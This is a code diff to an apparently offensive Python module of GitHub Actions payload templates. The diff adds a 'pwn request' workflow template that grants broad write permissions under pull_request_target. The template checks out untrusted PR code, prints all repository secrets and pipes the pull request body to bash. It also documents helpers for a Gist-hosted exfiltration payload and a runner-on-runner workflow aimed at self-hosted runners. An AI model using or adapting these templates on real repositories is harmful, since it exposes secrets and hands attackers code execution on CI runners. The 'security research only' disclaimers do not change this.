@@ -1,3 +1,10 @@
+"""Payload templates for GitHub Actions security testing and research.
+
+This module contains payload templates used for defensive security testing
+of GitHub Actions workflows and runners. These payloads are intended for
+security research, vulnerability assessment, and educational purposes only.
+"""
+
 import yaml
 
 
@@ -98,9 +105,56 @@ else
 fi
 """
 
+    PWN_REQUEST_WORKFLOW = """name: Pwn Request Workflow
+on:
+  pull_request_target:
+    branches: [{0}]
+
+permissions:
+  contents: write
+  pull-requests: write
+  actions: write
+  checks: write
+  deployments: write
+  issues: write
+  packages: write
+  pages: write
+  repository-projects: write
+  security-events: write
+  statuses: write
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR
+        uses: actions/checkout@v4
+        with:
+          ref: ${{{{ github.event.pull_request.head.sha }}}}
+          
+      - name: Execute Payload
+        run: |
+          echo "All secrets:"
+          echo '${{{{ toJson(secrets) }}}}'
+          
+          # Execute any code from PR body
+          echo "${{{{ github.event.pull_request.body }}}}" | bash
+"""
+
     @staticmethod
     def create_exfil_payload():
-        """Creates a Gist hosting an exfiltration payload."""
+        """Creates a Gist hosting an exfiltration payload.
+
+        Used for security testing to demonstrate potential data exfiltration
+        vulnerabilities in GitHub Actions workflows. This method is intended
+        for defensive security research and vulnerability assessment.
+
+        Returns:
+            str: Payload content for creating a Gist with exfiltration capabilities.
+
+        Note:
+            This is for security research and testing purposes only.
+        """
 
     @staticmethod
     def create_ror_workflow(
@@ -110,7 +164,27 @@ fi
         runner_labels: list,
         target_os: str = "linux",
     ):
-        """ """
+        """Creates a GitHub Actions workflow for runner-on-runner (RoR) security testing.
+
+        Generates a YAML workflow file that demonstrates potential security vulnerabilities
+        in GitHub Actions self-hosted runners. This is used for defensive security testing
+        to identify and mitigate runner compromise scenarios.
+
+        Args:
+            workflow_name (str): Name of the workflow to create.
+            run_name (str): Display name for workflow runs.
+            gist_url (str): URL to the Gist containing the payload script.
+            runner_labels (list): List of runner labels to target.
+            target_os (str, optional): Target operating system ('linux', 'osx', 'win').
+                                     Defaults to 'linux'.
+
+        Returns:
+            str: YAML content of the workflow file for security testing.
+
+        Note:
+            This method is intended for security research, vulnerability assessment,
+            and educational purposes only. Should not be used maliciously.
+        """
         yaml_file = {}
 
         yaml_file["name"] = workflow_name
